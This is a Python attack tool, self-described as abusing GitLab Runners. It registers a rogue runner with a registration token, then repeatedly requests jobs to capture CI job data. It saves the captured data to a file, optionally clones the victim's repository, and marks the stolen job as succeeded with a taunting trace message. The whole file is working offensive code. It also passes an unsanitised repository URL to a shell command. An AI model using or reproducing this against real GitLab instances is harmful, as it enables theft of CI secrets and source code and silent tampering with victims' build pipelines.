#!/usr/bin/env python3

import os, sys, argparse, requests, json

parser = argparse.ArgumentParser(description="Abuse GitLab Runners")
parser.add_argument('--target', dest='target', help="The GitLab instance to target")
parser.add_argument('--register', dest='register', help="Register a token")
parser.add_argument('--attack', dest='attack', help="Use Runner token to steal data")
parser.add_argument('--tag', dest='tag', help="Taglist separated with commas")
parser.add_argument('--clone', dest='clone', action="store_true", help="Will clone the repo locally")
args = parser.parse_args()

if len(sys.argv) < 2:
    parser.print_help()


""" This function formats the taglist for json """
def format_tags(tags):
    if tags:
        return ", \"tag_list\": \"%s\"" % tags
    else:
        return ""


""" This function will take a registration token and convert it into a runner token.
    That second token can then be used to steal job data """
def register_runner(registration_token, gitlab_target, tags):

    tag_list = format_tags(tags)

    REGISTRATION_JSON = '{"info":{"name":"gitlab-runner","version":"10.5.0","revision":"10.5.0","platform":"linux","architecture":"amd64","features":{"variables":false,"image":false,"services":false,"features":false,"cache":false,"shared":false}},"token":"%s","description":"sneaky_runner","run_untagged":true,"locked":true%s}' % (registration_token, tag_list)
    headers = { "Content-Type": "application/json" }

    response = requests.post(
            gitlab_target + "/api/v4/runners", 
            data=REGISTRATION_JSON, 
            headers=headers,
            verify=False
    )

    token = json.loads(response.text)
    print("Token:", token['token'])


""" This function will spam job requests and when it gets one will dump it's contents
    to a file """
def attack_runner(runner_token, gitlab_target, tags, clone):

    tag_list = format_tags(tags)

    RUNNER_JSON = '{"info":{"name":"gitlab-runner","version":"11.2.0","revision":"11.2.0","platform":"linux","architecture":"amd64","executor":"shell","shell":"bash","features":{"variables":true,"image":false,"services":false,"artifacts":true,"cache":true,"shared":true,"upload_multiple_artifacts":true}},"token":"%s","last_update":"bc5514b213c064c154d14a6008513cc0"%s}' % (runner_token, tag_list)
    headers = { "Content-Type": "application/json" }

    print("Going to start spamming. Gotta go fast...")
    finished = False
    sess = requests.Session()
    while not finished:
        response = sess.post(
            gitlab_target + "/api/v4/jobs/request",
            data=RUNNER_JSON,
            headers=headers,
            verify=False
        )

        if response.status_code == 201:
            with open('grabbed_data.json','w') as w:
                w.write(response.text)
            print(response.text)

            data = json.loads(response.text)
            if clone:
                os.system('git clone ' + data['git_info']['repo_url'])

            ## Let's troll a little bit :)
            id_num = data['id']
            resp_token = data['token']
            print("Stolen ID:", id_num)
            TROLL_JSON = '{"info":{"name":"gitlab-runner","version":"11.2.0","revision":"11.2.0","platform":"linux","architecture":"amd64","executor":"shell","shell":"bash","features":{"variables":true,"image":false,"services":false,"artifacts":true,"cache":true,"shared":true,"upload_multiple_artifacts":true}},"token":"%s","state":"success","trace":"\\u001b[0KHi friend! You\'ve hacked :)\\n\\u001b[0;m"}' % resp_token
            resp = sess.put(gitlab_target + "/api/v4/jobs/" + str(id_num), data=TROLL_JSON, headers=headers, verify=False)
            print("Response code:", resp.status_code)

            exit()


# Figure out what we are doing
if args.register:
    register_runner(args.register, args.target, args.tag)
if args.attack:
    attack_runner(args.attack, args.target, args.tag, args.clone)
